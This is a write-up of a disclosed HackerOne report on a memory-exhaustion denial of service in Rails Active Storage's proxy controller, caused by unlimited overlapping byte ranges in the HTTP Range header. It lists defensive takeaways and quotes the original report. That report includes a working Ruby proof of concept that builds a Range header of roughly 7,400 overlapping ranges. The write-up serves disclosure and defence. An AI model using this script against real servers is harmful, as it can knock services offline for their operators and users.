# Denial of Service via Crafted Range Header in Rails Active Storage

## Metadata
- **Source:** HackerOne
- **Report:** 2307813 | https://hackerone.com/reports/2307813
- **Submitted:** 2024-01-08
- **Reporter:** ooooooo_q
- **Program:** Rails (Ruby on Rails)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Denial of Service (Memory Exhaustion), Resource Exhaustion, Improper Input Validation
- **CVEs:** None
- **Category:** uncategorised

## Summary
Rails Active Storage's proxy controller fails to validate overlapping byte ranges in HTTP Range headers, allowing attackers to craft malicious Range headers that cause exponential memory consumption. A single request with hundreds of overlapping ranges can exhaust gigabytes of server memory, achieving DoS without requiring request completion.

## Attack scenario
1. Attacker uploads a file to a Rails application using Active Storage (e.g., user avatar)
2. Attacker obtains the proxy URL for the uploaded file (visible in rendered pages)
3. Attacker crafts a GET request with a malicious Range header containing hundreds of overlapping byte ranges (e.g., 'bytes=-999999999,-999999999,...')
4. Server's Rack::Utils.get_byte_ranges() parses all overlapping ranges without deduplication or limits
5. Active Storage's send_blob_byte_range_data() attempts to prepare data for each range, causing exponential memory allocation
6. Server's available memory is exhausted, causing application hang or crash

## Root cause
Rack::Utils.get_byte_ranges() accepts unlimited overlapping byte ranges without validation, and Rails Active Storage proxy controller does not implement server-side limits on the number or complexity of ranges before processing them. The vulnerability exists in both the upstream Rack library and Active Storage's consumption of it.

## Attacker mindset
Attacker seeks to achieve efficient DoS with minimal request overhead. By exploiting the Range header parsing logic, they can force servers to allocate massive amounts of memory per request. The attack is particularly attractive because: (1) it requires only HTTP GET requests without authentication, (2) memory is allocated before response completion allowing request abandonment, (3) it affects all Active Storage users regardless of firewall rules (some HTTP proxies like nginx limit header size, but Unicorn/Puma allow larger headers), and (4) uploaded files can be leveraged for demonstration/abuse.

## Defensive takeaways
- Implement maximum limits on the number of ranges allowed per Range header (RFC 7233 recommends reasonable limits)
- Deduplicate and merge overlapping/adjacent byte ranges before processing to reduce memory footprint
- Add server-side validation to reject Range headers exceeding configurable complexity thresholds
- Implement rate limiting or request throttling for Range requests from single sources
- Monitor memory usage patterns and alert on anomalous Range header requests
- Consider upstream fixes in Rack::Utils.get_byte_ranges() to handle range validation centrally
- Configure reverse proxy (nginx) with strict header size limits to reduce attack surface
- Log and audit suspicious Range header patterns for security monitoring

## Variant hunting
Test other file streaming implementations (Rack::Files, Rack::Sendfile) for similar range validation gaps
Check if other web frameworks (Django, Express, ASP.NET) implement proper Range header limits
Examine HEAD requests with Range headers to determine if memory exhaustion occurs before full response
Test HTTP/2 and HTTP/3 implementations of range handling for similar vulnerabilities
Investigate Accept-Ranges header presence as indicator of vulnerable implementations
Search for similar patterns in CDN origin shielding and byte-range caching logic
Test multipart byte-range responses for similar memory explosion issues
Analyze if conditional Range requests (If-Range) bypass validation logic

## MITRE ATT&CK
- T1190
- T1498
- T1499

## Notes
Report demonstrates practical PoC with exact reproduction steps. Key insight: even 50KB files can consume several hundred MB per request, and 1MB files trigger 10GB+ memory consumption. Attack efficiency improved by mid-request abandonment (server continues processing). Upstream Rack library also affected but Rails Active Storage more critical due to untrusted user-uploaded file handling. Header size limitations in nginx (8KB) vs Puma/Unicorn (80KB) create deployment-dependent impact variance. RFC 7233 defines Range request standards but Rails/Rack implementation lacks recommended safeguards on range complexity.

## Full report
<details><summary>Expand</summary>

I have crafted a request header for "range" against proxy url in Active Storage and confirmed that it will be a DoS.

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb#L14

```ruby
  def show
    if request.headers["Range"].present?
      send_blob_byte_range_data @blob, request.headers["Range"]
```      

https://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/concerns/active_storage/streaming.rb#L14

```ruby
    def send_blob_byte_range_data(blob, range_header, disposition: nil)
      ranges = Rack::Utils.get_byte_ranges(range_header, blob.byte_size)
```

The `Range` object returned by [Rack::Utils.get_byte_ranges](https://github.com/rack/rack/blob/v3.0.8/lib/rack/utils.rb#L435) will never exceed the file size, but there is no restriction on overlapping ranges.

```ruby
❯ bundle exec rails c
Loading development environment (Rails 7.1.2)
irb(main):001> Rack::Utils.get_byte_ranges("bytes=20-40", 200)
=> [20..40]
irb(main):002> Rack::Utils.get_byte_ranges("bytes=20-200,0-200,0-200,-200,-200,", 200)
=> [20..199, 0..199, 0..199, 0..199, 0..199]
```

## PoC

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new range_dos -G -M -C -A -J -T 
=>  Rails 7.1.2, Rack 3.0.8

❯ cd range_dos

❯ bin/rails active_storage:install

❯ bin/rails generate model User avatar:attachment 

❯ bin/rails db:migrate   
```

`config/routes.rb`

```ruby
Rails.application.routes.draw do
  resources :users
  get "up" => "rails/health#show", as: :rails_health_check
end
```

`app/controllers/users_controller.rb`

```ruby
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:avatar)
    end
end
```

`app/views/users/new.html.erb`

```html
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.file_field :avatar %><br>
  <%= form.submit %>
<% end %>
```

`app/views/users/show.html.erb`

```html
<% if @user.avatar.attached? %>
  <%= image_tag rails_storage_proxy_path(@user.avatar) %>
<% end %>
```

start server

```
# Comment out `config.force_ssl = true` in production.rb
❯ RAILS_ENV=production bundle exec rails s
```

After uploading the file on the `http://0.0.0.0:3000/users/new` screen, copy the proxy url that appears on the screen.
Sends the request using a crafted header for the url.

`range_request.rb`

```ruby
require 'net/http'

# set proxy url
url = URI.parse('http://0.0.0.0:3000/rails/active_storage/blobs/proxy/...')

req = Net::HTTP::Get.new(url.path)

# length = 8000 # Bad request

length = (80 * 1024 - "bytes=".bytesize) /  "-999999999,".bytesize
puts length 

req["Range"] = "bytes=" + "-999999999," * length 

res = Net::HTTP.start(url.host, url.port) {|http|
  http.request(req)
}

puts res.message
puts res.body.bytesize
```

```
❯ ruby range_request.rb
7446
Partial Content
410058706
```

If the target file is about 50 KB, each request will increase memory usage by several hundred MB.
If the file is nearly 1 MB, more than 10 GB of memory was used on the server side.

## Impact

When accessing the url of proxy, it is possible to put a load on the server's memory usage, etc., by repeatedly writing values in the `Range` request header. Even if the attacker stops the request midway through, the server continues to prepare data, making the attack more efficient.

The same problem exists with [Rack::Files](https://github.com/rack/rack/blob/main/lib/rack/files.rb#L85), but the problem is more serious with Active Stroage, which deals with files uploaded by users.

Additionally, when using nginx, the header length is limited to 8KB, which reduces the impact of the attack. 80KB is set in unicorn and puma.

</details>

---
*Analysed by Claude on 2026-05-24*
